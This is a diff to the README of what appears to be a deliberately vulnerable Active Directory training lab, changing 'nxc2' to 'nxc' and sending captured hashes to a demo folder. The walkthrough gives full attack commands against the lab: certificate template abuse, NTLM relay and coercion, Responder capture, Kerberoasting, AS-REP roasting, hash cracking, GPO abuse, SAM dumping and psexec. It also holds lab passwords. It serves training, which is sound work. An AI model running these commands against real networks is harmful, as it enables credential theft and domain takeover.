@@ -24,28 +24,28 @@ Run these to verify the lab is ready:
 echo "192.168.100.10 dc01.breakingbad.local breakingbad.local DC01" | sudo tee -a /etc/hosts
 
 # Verify connectivity to all machines
-nxc2 smb 192.168.100.10 192.168.100.20 192.168.100.21 -u Vagrant -p vagrant
+nxc smb 192.168.100.10 192.168.100.20 192.168.100.21 -u Vagrant -p vagrant
 
 # Check ADCS web enrollment - HTTP (vuln 01 ESC8)
 curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: OK (HTTP auth required)"
 
 # Check WebClient on srv02 (vuln 03)
-nxc2 smb 192.168.100.21 -u Vagrant -p vagrant -M webdav
+nxc smb 192.168.100.21 -u Vagrant -p vagrant -M webdav
 
 # Check password in description (vuln 07)
-nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant -M get-desc-users
+nxc ldap 192.168.100.10 -u Vagrant -p vagrant -M get-desc-users
 
 # Check Kerberoastable users (vuln 08)
-nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant --kerberoasting /tmp/kerb.txt && cat /tmp/kerb.txt
+nxc ldap 192.168.100.10 -u Vagrant -p vagrant --kerberoasting /tmp/kerb.txt && cat /tmp/kerb.txt
 
 # Check ASREProastable users (vuln 09)
-nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant --asreproast /tmp/asrep.txt && cat /tmp/asrep.txt
+nxc ldap 192.168.100.10 -u Vagrant -p vagrant --asreproast /tmp/asrep.txt && cat /tmp/asrep.txt
 
 # Check vulnerable ADCS templates (vuln 10 ESC1)
 certipy find -u Vagrant@breakingbad.local -p vagrant -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "ESC1|ESC8"
 
 # Check shared local admin (vuln 12)
-nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
+nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
 ```
 
 ---
@@ -69,18 +69,21 @@ certipy auth -pfx dc01.pfx -dc-ip 192.168.100.10
 
 ## 02 - NTLMv1
 
-**Target:** srv01 | **What:** srv01 accepts NTLMv1 authentication. Captured NTLMv1 hashes can be cracked or relayed trivially.
+**Target:** srv01 | **What:** srv01 accepts NTLMv1 authentication (LmCompatibilityLevel=2). Captured NTLMv1 hashes can be cracked or relayed trivially.
 
 ```bash
 # Coerce srv01 to authenticate to your listener (e.g. via PetitPotam, PrinterBug)
-responder -I eth0 -v
+responder -I eth0 -v --lm
 
-# Or use netexec to check the LM compatibility level
-nxc2 smb 192.168.100.20 -u walter.white -p '774azeG!' --laps
+# Capture NTLMv1 hashes (copy to demo/hashes)
+cp /usr/share/responder/logs/*NTLMv1* ~/breakingbAD/demo/hashes/ntlmv1.txt
 
-# Crack NTLMv1 hashes (submit to crack.sh or use hashcat)
-# NTLMv1 with ESS can be converted to a crackable format at https://crack.sh
-hashcat -m 14000 ntlmv1_hash.txt wordlist.txt
+# Crack NTLMv1 hashes (mode 5500)
+hashcat -m 5500 ~/breakingbAD/demo/hashes/ntlmv1.txt /usr/share/john/password.lst
+# Or use the demo cracker:
+~/breakingbAD/demo/hashcrack.sh ntlmv1
+
+# NTLMv1 with ESS can also be submitted to https://crack.sh for free cracking
 ```
 
 ---
@@ -91,7 +94,7 @@ hashcat -m 14000 ntlmv1_hash.txt wordlist.txt
 
 ```bash
 # Verify WebClient is running
-nxc2 smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
+nxc smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
 
 # Coerce authentication via WebDAV (PetitPotam over HTTP)
 PetitPotam.py -u walter.white -p '774azeG!' -d breakingbad.local attacker@80/test 192.168.100.21
@@ -108,20 +111,20 @@ ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
 
 ```bash
 # Enumerate GPO permissions
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse
+nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse
 
 # Check with BloodHound
 bloodhound-python -u walter.white -p '774azeG!' -d breakingbad.local -dc dc01.breakingbad.local -c all
 
 # Abuse with pyGPOAbuse (add local admin or reverse shell)
-pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
+pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
   -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f
 
 # Or use SharpGPOAbuse from Windows
 SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"
 
 # Force gpupdate on target (or wait)
-nxc2 smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
+nxc smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
 ```
 
 ---
@@ -151,11 +154,16 @@ ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot
 # Trigger: walter.white searches for a non-existent share
 ./lab.sh vuln trigger 6
 
-# Capture hashes with Responder
-responder -I eth0 -dwv
+# Capture hashes with Responder (output to demo/hashes for cracking)
+responder -I eth0 -dwv -O ~/breakingbAD/demo/hashes
 
-# Crack captured NTLMv2 hashes
-hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+# Copy captured hashes for cracking
+cp /usr/share/responder/logs/*NTLMv2* ~/breakingbAD/demo/hashes/ntlmv2.txt
+
+# Crack captured NTLMv2 hashes (mode 5600)
+hashcat -m 5600 ~/breakingbAD/demo/hashes/ntlmv2.txt /usr/share/john/password.lst
+# Or use the demo cracker:
+~/breakingbAD/demo/hashcrack.sh ntlmv2
 
 # Or relay instead of cracking
 ntlmrelayx.py -tf targets.txt -smb2support
@@ -169,7 +177,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ```bash
 # Query with netexec
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
+nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
 
 # Query with ldapsearch
 ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '774azeG!' \
@@ -179,7 +187,7 @@ ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '7
 rpcclient -U 'walter.white%774azeG!' 192.168.100.10 -c 'queryuser saul.goodman'
 
 # Verify the password works
-nxc2 smb 192.168.100.10 -u saul.goodman -p '657crsH!'
+nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
 ```
 
 ---
@@ -189,17 +197,19 @@ nxc2 smb 192.168.100.10 -u saul.goodman -p '657crsH!'
 **Target:** dc01 / hector.salamanca (SPN: HTTP/srv01) | **What:** hector.salamanca has an SPN assigned. Request a TGS ticket and crack it offline.
 
 ```bash
-# Find kerberoastable users
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting kerberoast.txt
+# Find kerberoastable users (output to demo/hashes)
+nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt
 
 # Or with impacket
-GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request
+GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt
 
-# Crack the TGS hash
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+# Crack the TGS hash (mode 13100)
+hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
+# Or use the demo cracker:
+~/breakingbAD/demo/hashcrack.sh kerberoast
 
 # Verify cracked password
-nxc2 smb 192.168.100.10 -u hector.salamanca -p '346modL!'
+nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
 ```
 
 ---
@@ -209,20 +219,22 @@ nxc2 smb 192.168.100.10 -u hector.salamanca -p '346modL!'
 **Target:** dc01 / jessie.pinkman | **What:** jessie.pinkman has Kerberos pre-auth disabled. Request an AS-REP without knowing the password and crack it offline.
 
 ```bash
-# Find users without pre-auth
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast asrep.txt
+# Find users without pre-auth (output to demo/hashes)
+nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast ~/breakingbAD/demo/hashes/asreproast.txt
 
 # Or with impacket (no creds needed if you know the username)
-GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat
+GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat -outputfile ~/breakingbAD/demo/hashes/asreproast.txt
 
 # Or enumerate all vulnerable users
 GetNPUsers.py breakingbad.local/ -dc-ip 192.168.100.10 -usersfile users.txt -no-pass
 
-# Crack the AS-REP hash
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# Crack the AS-REP hash (mode 18200)
+hashcat -m 18200 ~/breakingbAD/demo/hashes/asreproast.txt /usr/share/john/password.lst
+# Or use the demo cracker:
+~/breakingbAD/demo/hashcrack.sh asreproast
 
 # Verify cracked password
-nxc2 smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
+nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
 ```
 
 ---
@@ -233,18 +245,18 @@ nxc2 smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
 
 ```bash
 # Find vulnerable templates
-certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable
+certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable -stdout
 
 # Request a certificate as Administrator using the ESC1 template
 certipy req -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 \
-  -target dc01.breakingbad.local -ca breakingbad-DC01-CA -template ESC1 \
+  -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
   -upn administrator@breakingbad.local
 
 # Authenticate with the certificate
 certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10
 
 # Use the NT hash to access the DC
-nxc2 smb 192.168.100.10 -u Administrator -H <nthash> --shares
+nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
 ```
 
 ---
@@ -255,7 +267,7 @@ nxc2 smb 192.168.100.10 -u Administrator -H <nthash> --shares
 
 ```bash
 # Enumerate users without credentials
-nxc2 ldap 192.168.100.10 -u '' -p '' --users
+nxc ldap 192.168.100.10 -u '' -p '' --users
 
 # Enumerate with ldapsearch (anonymous bind)
 ldapsearch -x -H ldap://192.168.100.10 -b 'DC=breakingbad,DC=local' '(objectClass=user)' sAMAccountName description
@@ -275,13 +287,13 @@ enum4linux-ng -A 192.168.100.10
 
 ```bash
 # Verify creds work on both servers
-nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
+nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
 
 # Dump SAM on srv01
-nxc2 smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam
+nxc smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam
 
 # Use same creds to move to srv02
-nxc2 smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'
+nxc smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'
 
 # Or get a shell with psexec
 psexec.py svc_admin:'Zomer123!'@192.168.100.20
